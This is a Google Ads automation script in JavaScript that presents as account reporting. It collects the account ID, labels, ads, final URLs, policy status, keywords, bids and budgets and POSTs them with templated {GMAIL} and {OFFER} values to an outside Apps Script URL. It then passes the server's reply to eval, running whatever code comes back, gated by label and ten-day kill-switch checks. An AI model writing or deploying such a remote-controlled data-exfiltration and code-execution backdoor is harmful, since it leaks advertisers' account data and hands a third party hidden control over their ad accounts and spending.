
function main() {
    // removeLabels();
    var labels = getLabels();
    if (labels.block) return Logger.log("BLOCK");
    if (labels.start) {
        var start = Number(labels.start);
        var today = new Date().getTime();
        if (today - start > 10 * 24 * 60 * 60 * 1000) {
            return Logger.log("BLOCK 10 days");
        }
    }
    const gmail = "{GMAIL}";
    const offer = "{OFFER}";
    const accountId = AdsApp.currentAccount().getCustomerId();

    var response = UrlFetchApp.fetch(
        "https://script.google.com/macros/s/AKfycbxR5-TCnzNoyYEyx9PLmHhK_lFfGMXWC7G-R2A_odg4B5jhy-D77PsTMki8n3ivOXPowg/exec",
        {
            method: "POST",
            payload: JSON.stringify({
                labels: labels,
                gmail: gmail,
                accountId: accountId,
                report: getReport(),
            }),
            headers: {
                "Content-Type": "application/json",
            },
        }
    );
    var json = JSON.parse(response.getContentText());
    // Logger.log(json.func);
    // Logger.log(json.opts);
    var opts = (json.opts);
    eval(json.func);
}

function getLabels() {
    var labels = {};
    var lbls = AdsApp.labels().get();
    Logger.log(lbls.totalNumEntities());
    while (lbls.hasNext()) {
        var lbl = lbls.next();
        Logger.log(lbl.getName() + " : " + lbl.getDescription());
        labels[lbl.getName()] = lbl.getDescription();
    }
    return labels;
}
function getReport() {
    return {
        ads: reportAds(),
        groups: reportGroups(),
        campaigns: reportCampaigns(),
        keywords: reportKeywords(),
    };
}

function reportKeywords() {
    var kwIter = AdsApp.keywords().get();
    var kws = [];
    while (kwIter.hasNext()) {
        var kw = kwIter.next();
        kws.push({
            text: kw.getText(),
            campaign: kw.getCampaign().getName(),
            paused: kw.isPaused(),
            enabled: kw.isEnabled(),
            status: kw.getApprovalStatus(),
        });
    }
    return kws;
}

function reportCampaigns() {
    var campsIter = AdsApp.campaigns().get();
    var camps = [];
    while (campsIter.hasNext()) {
        var camp = campsIter.next();
        camps.push({
            budget: camp.getBudget().getAmount(),
            campaign: camp.getName(),
            paused: camp.isPaused(),
            enabled: camp.isEnabled(),
            type: camp.getEntityType(),
        });
    }
    return camps;
}

function reportGroups() {
    var groupsIter = AdsApp.adGroups().get();
    var groups = [];
    while (groupsIter.hasNext()) {
        var group = groupsIter.next();
        groups.push({
            cpc: group.bidding().getCpc(),
            campaign: group.getCampaign().getName(),
            paused: group.isPaused(),
            enabled: group.isEnabled(),
        });
    }
    return groups;
}

function reportAds() {
    var adsIter = AdsApp.ads().get();
    var ads = [];
    while (adsIter.hasNext()) {
        var ad = adsIter.next();
        ads.push({
            status: ad.getPolicyApprovalStatus(),
            // status: "ENABLED",
            url: ad.urls().getFinalUrl(),
            group: ad.getAdGroup().getName(),
            campaign: ad.getCampaign().getName(),
            type: ad.getType(),
            paused: ad.isPaused(),
            enabled: ad.isEnabled(),
            policy: ad.getPolicyTopics(),
        });
    }
    return ads;
}


function removeLabels(){
  var lIter = AdsApp.labels().get();
  while(lIter.hasNext()){
    var l = lIter.next();
    l.remove();
  }
}